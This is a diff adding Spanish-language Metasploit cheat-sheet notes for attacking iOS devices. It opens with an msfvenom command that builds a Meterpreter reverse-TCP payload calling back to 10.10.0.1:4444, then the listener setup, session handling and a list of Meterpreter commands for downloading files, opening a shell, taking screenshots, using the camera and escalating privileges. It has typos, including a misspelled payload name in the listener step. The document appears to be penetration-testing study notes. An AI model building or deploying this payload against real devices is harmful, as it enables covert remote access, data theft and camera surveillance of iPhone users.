@@ -1,0 +1,68 @@
+# Genareación del Payload (iOS)
+msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=10.10.0.1 lport=4444 -f macho -o payload
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener)
+use exploit/multi/handler [TYPE]
+set payload aaple_ios/aarch64/meterpreter_reverse_tcp [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 4444 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Meterpreter Commands (iOS - System Information)
+
+help → Muestra todos los comandos disponibles en Meterpreter.
+sysinfo → Muestra información del dispositivo iOS (modelo, versión de iOS, arquitectura).
+getuid → Muestra el usuario actual del proceso (normalmente dentro del sandbox).
+getpid → Muestra el ID del proceso actual donde se ejecuta Meterpreter.
+getenv → Muestra variables de entorno del sistema o de la aplicación.
+
+# Meterpreter Commands (iOS - File System)
+
+pwd → Muestra el directorio actual dentro del entorno accesible.
+ls → Lista archivos y carpetas disponibles en la sandbox.
+cd → Cambia de directorio dentro del entorno permitido.
+cat → Muestra el contenido de un archivo.
+download → Descarga archivos accesibles desde el dispositivo iOS.
+upload → Sube archivos al dispositivo iOS (limitado por permisos).
+search → Busca archivos dentro del entorno accesible.
+
+# Meterpreter Commands (iOS - Execution)
+
+shell → Abre una terminal limitada del sistema iOS.
+execute → Ejecuta comandos dentro del entorno permitido.
+run → Ejecuta módulos internos de Meterpreter.
+
+# Meterpreter Commands (iOS - Network)
+
+ifconfig → Muestra la configuración de red del dispositivo.
+route → Muestra la tabla de rutas de red.
+
+# Meterpreter Commands (iOS - Camera & Screen)
+
+screenshot → Captura la pantalla del dispositivo (si está soportado).
+webcam_list → Lista cámaras disponibles.
+webcam_snap → Toma una foto con la cámara (muy limitado en iOS moderno).
+webcam_stream → Transmisión en vivo de la cámara (normalmente no funcional en iOS actual).
+
+# Meterpreter Commands (iOS - Sessions)
+
+background → Envía la sesión a segundo plano.
+sessions → Lista sesiones activas.
+sessions -i <id> → Interactúa con una sesión específica.
+exit → Cierra la sesión de Meterpreter.
+
+# Meterpreter Commands (iOS - Privileges)
+
+getsystem → Intenta escalar privilegios (normalmente falla sin jailbreak).
+getprivs → Muestra privilegios disponibles del proceso.
+rev2self → Vuelve al usuario original de la sesión.
